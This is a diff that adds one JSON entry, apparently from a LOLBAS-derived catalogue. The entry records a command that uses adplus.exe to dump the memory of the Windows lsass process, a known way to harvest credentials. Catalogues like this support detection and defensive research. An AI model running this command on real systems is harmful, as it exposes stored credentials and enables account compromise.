@@ -1,0 +1,23 @@
+{
+  "id": "lolbas-adplus-exe-dump-1",
+  "name": "LOLBAS · adplus.exe (Dump) #1",
+  "command": "adplus.exe -hang -pn lsass.exe -o {PATH_ABSOLUTE:folder} -quiet",
+  "description": "Creates a memory dump of the lsass process",
+  "platform": "windows",
+  "tags": [
+    "lolbas",
+    "adplus",
+    "dump"
+  ],
+  "source": "lolbas",
+  "source_url": "https://lolbas-project.github.io/lolbas/adplus/",
+  "upstream_id": "adplus.exe/Dump/0",
+  "category": "lolbas",
+  "subcategory": "dump",
+  "references": [
+    {
+      "title": "LOLBAS — adplus.exe",
+      "url": "https://lolbas-project.github.io/lolbas/adplus/"
+    }
+  ]
+}
